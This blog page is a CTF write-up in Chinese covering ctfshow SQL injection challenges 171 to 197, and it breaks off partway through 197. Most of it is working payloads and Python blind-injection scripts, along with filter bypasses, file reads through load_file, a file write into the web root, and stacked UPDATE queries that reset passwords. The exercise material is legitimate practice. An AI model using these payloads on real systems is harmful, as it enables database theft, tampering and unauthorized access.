<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow sql注入 171~ - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow sql注入 171~" />
<meta property="og:description" content="参考：
https://y4tacker.blog.csdn.net/article/details/110144623
https://blog.51cto.com/u_15072927/3946335
171 爆库：-1&#39;union select 1,2,database();--&#43; 爆表：-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#34;ctfshow_web&#34;;--&#43; 爆列：-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#34;ctfshow_user&#34; --&#43; 爆值：-1&#39;union select id,username,password from ctfshow_user --&#43; 172 这题只有两个回显，且返回值不能有flag，可以用编码回显。
-1&#39;union select to_base64(username),hex(password) from ctfshow_user2 --&#43; 或
-1&#39;union select id,password from ctfshow_user2 where username=&#34;flag&#34;--&#43; 联合查询列数和以前一样，可以查id，这样就不会返回username中的flag值
173 //检查结果是否有flag if(!preg_match(&#39;/flag/i&#39;, json_encode($ret))){ $ret[&#39;msg&#39;]=&#39;查询成功&#39;; } 同上
1&#39; union select id,to_base64(username),hex(password) from ctfshow_user3--&#43; 174 法1：
虽然它对返回的值有限制，但是我们可以用盲注，例如下面的会返回：
1&#39;and 1=1;--&#43;
抓包看一下地址
import requests url = &#34;http://82424899-6cd3-4fab-83ca-7cf8d1f9caa3.challenge.ctf.show/api/v4.php?id=1&#39; and &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/b1834f91ba2c593faaefd3f3ad56f41c/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-12T12:07:57+08:00" />
<meta property="article:modified_time" content="2022-11-12T12:07:57+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow sql注入 171~</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>参考：<br> <code>https://y4tacker.blog.csdn.net/article/details/110144623</code><br> <code>https://blog.51cto.com/u_15072927/3946335</code></p> 
<h2><a id="171_3"></a>171</h2> 
<pre><code class="prism language-sql">爆库：<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,database();--+

爆表：-1'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"ctfshow_web"</span><span class="token punctuation">;</span><span class="token comment">--+</span>

爆列：<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user" --+

爆值：-1'</span><span class="token keyword">union</span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user <span class="token comment">--+</span>
</code></pre> 
<h2><a id="172_15"></a>172</h2> 
<p>这题只有两个回显，且返回值不能有<code>flag</code>，可以用<code>编码回显</code>。</p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> to_base64<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_user2 <span class="token comment">--+</span>
</code></pre> 
<p>或</p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user2 <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">"flag"</span><span class="token comment">--+</span>
</code></pre> 
<p>联合查询列数和以前一样，可以查id，这样就不会返回username中的<code>flag</code>值</p> 
<h2><a id="173_25"></a>173</h2> 
<pre><code class="prism language-sql"><span class="token comment">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg_match<span class="token punctuation">(</span><span class="token string">'/flag/i'</span><span class="token punctuation">,</span> json_encode<span class="token punctuation">(</span>$ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>{
      $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>
    }
</code></pre> 
<p>同上</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>to_base64<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_user3<span class="token comment">--+</span>
</code></pre> 
<h2><a id="174_37"></a>174</h2> 
<p><strong>法1：</strong><br> 虽然它对返回的值有限制，但是我们可以用盲注，例如下面的会返回：<br> <code>1'and 1=1;--+</code><br> <img src="https://images2.imgbox.com/f8/ab/CG7thf4e_o.png" alt="在这里插入图片描述"><br> 抓包看一下地址<br> <img src="https://images2.imgbox.com/03/70/arNKcs5Q_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-sql"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://82424899-6cd3-4fab-83ca-7cf8d1f9caa3.challenge.ctf.show/api/v4.php?id=1' and "</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>:
        <span class="token keyword">for</span> j <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span>:
            try:
                payload <span class="token operator">=</span> f<span class="token string">'if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))={j},1,0);--+'</span>
                req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token keyword">text</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token operator">in</span> req<span class="token punctuation">.</span><span class="token keyword">text</span>:
                    result <span class="token operator">+</span><span class="token operator">=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
            <span class="token keyword">except</span>:
                <span class="token keyword">continue</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

</code></pre> 
<p>limit 24,1 :读第二十五行<br> substr(xxx,{i},1)：截取第几个字符串<br> ascii：转化为ascii码比较<br> if(xxx={j},1,0)：如果xxx等于{j}返回1，否则0</p> 
<p>从password的第一个字符开始查起，每次查一个字符，转换成ascii码，在和ascii值38-128挨个比较，当查到的flag其中的一个字符ascii值&gt;某个ascii码（38~128），例如当flag其中的一个字符a&gt;97，返回布尔值false，此时页面显示Error…，说明ascii值97为flag中的一个字符。</p> 
<p>二分法版本</p> 
<pre><code class="prism language-sql"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span>:
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail:
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))&gt;{mid},1,0) -- -'</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token operator">in</span> r<span class="token punctuation">.</span><span class="token keyword">text</span>:
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span>:
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span>:
        result <span class="token operator">+</span><span class="token operator">=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span>:
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="175_104"></a>175</h2> 
<h3><a id="00x1_105"></a>00x1内容传入文件</h3> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'union select 1,password from ctfshow_user5 into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt'<span class="token comment">--+&amp;page=1&amp;limit=10</span>

<span class="token comment">//把password的第一页的前十条的内容写入网站根目录下的1.txt里面然后访问就行了。</span>
</code></pre> 
<h3><a id="_111"></a>时间盲注</h3> 
<p>非二分：</p> 
<pre><code class="prism language-sql"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://0bbc92d7-ad80-4097-9388-3da10dd18a26.challenge.ctf.show/api/v5.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">""</span>
result1 <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>:
    <span class="token keyword">for</span> j <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span>:
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(4),0);--+'</span>
        try:
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*********no:"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e:
            result <span class="token operator">+</span><span class="token operator">=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
</code></pre> 
<p><code>requests.get(url + payload, timeout=3)</code>意思是如果连接超过三秒则报错，也就是转入except 中<br> 二分：</p> 
<pre><code class="prism language-sql"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span>:
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail:
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))&gt;{mid},sleep(2),0) -- -'</span>
        try:
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e:
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span>:
        result <span class="token operator">+</span><span class="token operator">=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span>:
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="176_162"></a>176</h2> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span>
</code></pre> 
<p>或</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token keyword">uNion</span> <span class="token keyword">sElect</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user <span class="token comment">--+</span>
</code></pre> 
<pre><code class="prism language-sql"><span class="token number">999</span><span class="token string">' or username='</span>flag
前面报错，执行后一句
</code></pre> 
<h2><a id="177_177"></a>177</h2> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token comment">/**/</span><span class="token keyword">uniON</span><span class="token comment">/**/</span><span class="token keyword">SElect</span><span class="token comment">/**/</span>password<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>ctfshow_user<span class="token comment">/**/</span><span class="token keyword">where</span><span class="token comment">/**/</span>username<span class="token operator">=</span><span class="token string">"flag"</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>或</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h2><a id="178_188"></a>178</h2> 
<p>过滤了*，可以用%09代替空格，%09为tab</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">09</span>union<span class="token operator">%</span><span class="token number">09</span>select<span class="token operator">%</span><span class="token number">091</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token operator">%</span><span class="token number">09</span>from<span class="token operator">%</span><span class="token number">09</span>ctfshow_user<span class="token operator">%</span><span class="token number">09</span>where<span class="token operator">%</span><span class="token number">09</span>username<span class="token operator">=</span><span class="token string">"flag"</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>或</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h2><a id="179_199"></a>179</h2> 
<p>不得不说一句，这句真是万能啊！</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>或</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token keyword">union</span><span class="token operator">%</span><span class="token number">0</span>cselect<span class="token operator">%</span><span class="token number">0</span>c1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token operator">%</span><span class="token number">0</span>cfrom<span class="token operator">%</span><span class="token number">0</span>cctfshow_user<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<h2><a id="180_209"></a>180</h2> 
<p>把查询的结果作为名称</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c'</span>flag'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0</span>c<span class="token comment">--%0c</span>
</code></pre> 
<p>注入前：<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p> 
<pre><code>and 的优先级比 or 要高
注入后语句为：
select id,username,password from ctfshow_user where username != 'flag' and id = '0'or(id=26)and'1' limit 1;
也就是：
username != 'flag' and id = '0'       or        (id=26)and'1'
因为id=0不存在，所以就是：
(0) or(id=26)and'1' limit 1;

payload：
id=-1'or(id=26)and'1'='1
</code></pre> 
<p>或者</p> 
<pre><code class="prism language-sql"><span class="token number">999</span><span class="token string">'%0cunion%0cselect'</span><span class="token number">1</span><span class="token string">',(select`password`from`ctfshow_user`where`username`='</span>flag<span class="token string">'),'</span><span class="token number">3</span>
</code></pre> 
<h2><a id="web_181_233"></a>web 181</h2> 
<p>payload：</p> 
<pre><code>id=-1'or(id=26)and'1'='1
</code></pre> 
<h2><a id="web182_239"></a>web182</h2> 
<p>原理同上。</p> 
<h2><a id="web183_241"></a>web183</h2> 
<p>查询语句：</p> 
<pre><code>//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";
</code></pre> 
<p>过滤：</p> 
<pre><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
</code></pre> 
<p>查询结果</p> 
<pre><code>//返回用户表的记录总数
      $user_count = 0;

</code></pre> 
<p>and和or也被过滤了，那么我们就爆破呗。</p> 
<pre><code>import requests
url = 'http://41bc79ba-0dbf-46e1-a0a7-258dc990dafc.challenge.ctf.show/select-waf.php'
word = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
flag = 'ctfshow{'

for i in range(50):
    if flag[-1] == "}":
        break
    for j in word:
        data = {"tableName": "(ctfshow_user)where(pass)like'{}%'".format(flag + j)}
        req = requests.post(url=url,data=data)
        if '$user_count = 1;' in req.text:
            flag += j;
            print(flag)
            break
</code></pre> 
<h2><a id="web_184_281"></a>web 184</h2> 
<p>和上一题相比，过滤了where 和 引号，where 可以用 having代替，引号可以用编码绕过。</p> 
<pre><code>import requests
url = 'http://b8253f3e-046c-40ea-9202-dfb5ae1a6379.challenge.ctf.show/select-waf.php'
word = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
flag = 'ctfshow{'

def str_to_hex(str):
    str = bytes(str, encoding='utf-8')
    str = '(0x' + str.hex() + '25)'
    return str


for i in range(50):
    if flag[-1] == "}":
        break
    for j in word:
        payload = "(ctfshow_user) group by pass having(pass)like" + str_to_hex(flag + j)
        print(payload)
        data = {"tableName": payload}
        req = requests.post(url=url,data=data)
        if '$user_count = 1;' in req.text:
            flag += j;
            print(flag)
            break


</code></pre> 
<h2><a id="web_185_310"></a>web 185</h2> 
<p>过滤了数字，可以用 concat 和 char来构造数字。</p> 
<p>例如：</p> 
<pre><code>c的ascii为99
那么c=char(ture+ture+ture......) 99个true。

cc就是
concat(char(99个true),char(99个true))
</code></pre> 
<p>payload:</p> 
<pre><code>import requests
url = 'http://34c76f3c-de55-4651-90e4-c960a26b1474.challenge.ctf.show/select-waf.php'
word = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
flag = 'ctfshow{'

def int_to_str(str):
    payload = 'concat('
    for s in str:
        payload += 'char(true' + '+true'*(ord(s)-1) + '),'
    return payload[:-1]+')'


for i in range(50):
    if flag[-1] == "}":
        break
    for j in word:
        payload = "(ctfshow_user) group by pass having(pass)like(" + int_to_str(flag + j + '%') + ')'
        print(payload)
        data = {"tableName": payload}
        req = requests.post(url=url,data=data)
        if '$user_count = 1;' in req.text:
            flag += j
            print(flag)
            break
</code></pre> 
<h2><a id="web_186_350"></a>web 186</h2> 
<p>同上</p> 
<h2><a id="web_187_352"></a>web 187</h2> 
<p>熟悉的代码，也就要我们构造一个md5 后有 <code>'or'数字...</code> 的一串字符。<br> <code> $password = md5($_POST['password'],true);</code></p> 
<pre><code>username=admin&amp;password=ffifdyop
</code></pre> 
<h2><a id="web_188_358"></a>web 188</h2> 
<p><code>$row['pass']==intval($password)</code><br> 若等于，只要password 有字母，我们就可以令password 为 0，这样0=0就会永远成立。</p> 
<p>令username=0 或者 1||1 可以查看所有的信息<br> <img src="https://images2.imgbox.com/62/f2/Uoll0lGJ_o.png" alt="在这里插入图片描述"><br> 但还是有点区别的 1||1 可以查看到username 为数字字符串的数据，而为username=0就不可以了。</p> 
<p>我是这么理解的，<code>username=0</code>时，mysql会取对比，又因为在mysql中字符串和数字比较的时候，值为0，所以会查到所有username 为数字字符串的数据，而<code>username=1||1</code> 时，就没这个问题了。<br> <img src="https://images2.imgbox.com/6d/51/JKvYWEpC_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8d/1c/bClLxtCW_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web_189_369"></a>web 189</h2> 
<p>题目提示：flag在api/index.php文件中</p> 
<p>当username=if(1=1,1,0)和if(1=2,1,0)时值不同，可以判断盲注。</p> 
<pre><code>import requests
import time

url = "http://fef4f6a5-2029-455e-a1fc-680c1c3378c9.challenge.ctf.show/api/"

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head &lt; tail):
        time.sleep(0.1)
        mid = head + tail &gt;&gt; 1
        payload = "if(ascii(substr((load_file('/var/www/html/api/index.php')),%d,1))&gt;%d,1,0)" % (i, mid)
        data = {
            'username':payload,
            'password':'1'
        }
        r = requests.post(url=url,data=data)
        if "\\u67e5\\u8be2\\u5931\\u8d25" in str(r.text):
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(ascii(name))
    else:
        continue
</code></pre> 
<h2><a id="web_190_405"></a>web 190</h2> 
<p>布尔盲注：<code>admin' and if(1=1,1,0)#</code>和<code>admin' and if(1=2,1,0)#</code>回显不一样。</p> 
<pre><code>import requests
import time

url = "http://c7d6676a-103c-48da-ab5a-232ded1de212.challenge.ctf.show/api/"

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head &lt; tail):
        time.sleep(0.1)
        mid = head + tail &gt;&gt; 1
       
        payload = "admin' and if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),%d,1))&gt;%d,1,0)#" % (i, mid)
        data = {
            'username':payload,
            'password':'1'
        }
        r = requests.post(url=url,data=data)
        if "\\u5bc6\\u7801\\u9519\\u8bef" in str(r.text):
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(ascii(name))
    else:
        continue
</code></pre> 
<h2><a id="web_191_439"></a>web 191</h2> 
<p>过滤了ascii，但是问题不大，可以用ord 替换它。</p> 
<pre><code>import requests
import time

url = "http://e8e80969-0604-4712-a084-be535faf7ca6.challenge.ctf.show/api/"

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head &lt; tail):
        time.sleep(0.1)
        mid = head + tail &gt;&gt; 1
        
        payload = "admin' and if(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),%d,1))&gt;%d,1,0)#" % (i, mid)
        data = {
            'username':payload,
            'password':'1'
        }
        r = requests.post(url=url,data=data)
        if "\\u5bc6\\u7801\\u9519\\u8bef" in str(r.text):
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(ascii(name))
    else:
        continue
</code></pre> 
<h2><a id="web_192_474"></a>web 192</h2> 
<p>不仅过滤了ascii函数还过滤了ord函数，可以用 like 来盲注，也可以用regexp来匹配。</p> 
<pre><code>import requests
url = 'http://4365ad46-55e4-42a1-9a6d-000ebd747751.challenge.ctf.show/api/'
word = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
flag = ''

for i in range(50):
    for j in word:
        data = {
            "username": f"admin' and if((substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)like('{j}%')),1,0)#",
            'password':'1'
        }
        req = requests.post(url=url,data=data)
        if '\\u5bc6\\u7801\\u9519\\u8bef' in req.text:
            flag += j
            print(flag)
            break
</code></pre> 
<h2><a id="web_193_494"></a>web 193</h2> 
<p>多过滤了 substr，我们还可以用left，right等函数截取，也可以直接匹配，结果都一样。</p> 
<pre><code>import requests
url = 'http://cd1840a8-d31e-4de4-9146-2043bcedb0a0.challenge.ctf.show/api/'
word = 'abcdefghijklmnopqrstuvwxyz0123456789-{}'
flag = ''
check_flag = ''
for i in range(50):
    for j in word:
        check_flag += j
        data = {
            "username": f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)like('{check_flag}%'),1,0)#",
            'password': '123'
        }
        check_flag = flag
        #print(check_flag)
        req = requests.post(url=url,data=data)
        if '密码错误' in req.json()['msg']:
            flag += j
            print(flag)
            break
</code></pre> 
<h2><a id="web_194_517"></a>web 194</h2> 
<p>同上：</p> 
<pre><code>import requests
url = 'http://92d47175-665f-416c-a917-07243877f768.challenge.ctf.show/api/'
word = 'abcdefghijklmnopqrstuvwxyz0123456789-{}'
flag = ''
check_flag = ''
for i in range(50):
    for j in word:
        check_flag += j
        data = {
            "username": f"admin' and if((select group_concat(f1ag) from ctfshow_fl0g)like('{check_flag}%'),1,0)#",
            'password': '123'
        }
        check_flag = flag
        req = requests.post(url=url,data=data)
        if '密码错误' in req.json()['msg']:
            flag += j
            print(flag)
            break
</code></pre> 
<h2><a id="web_195_539"></a>web 195</h2> 
<p>过滤了select，无法查询了，且username 后面没有引号包住，所以要用编码表示</p> 
<pre><code>  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
</code></pre> 
<p>返回逻辑</p> 
<pre><code>  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
      
</code></pre> 
<p>payload:把密码全改为111</p> 
<pre><code>0x61646d696e;update`ctfshow_user`set`pass`=0x313131;
111
</code></pre> 
<p>也可以只改admin的密码：</p> 
<pre><code>0x61646d696e;update`ctfshow_user`set`pass`=(0x313131)where`username`=0x61646d696e;
111
</code></pre> 
<h2><a id="web_196_581"></a>web 196</h2> 
<p>虽然题目上显示过滤了select，但是实际上并没有过滤select ，还是太年轻啊。</p> 
<pre><code>
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)&gt;16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
</code></pre> 
<p>payload：</p> 
<pre><code>1;select(1)
1
</code></pre> 
<p>原理：pass会返回1；<br> <img src="https://images2.imgbox.com/23/88/oIllFUFQ_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web_197_609"></a>web 197</h2> 
<p>又学到一个新姿势，通过改列名来盲注passwd。<br> 查询语句：</p> 
<pre><code>  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
</code></pre> 
<p>返回逻辑：过滤了select 和 set ，说明预处理查询也不行了，那么就无法获取值来进行布尔盲注了，这边我就不知道该怎么办了。</p> 
<pre><code>  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username)){
    $ret['msg']='用户名非法';
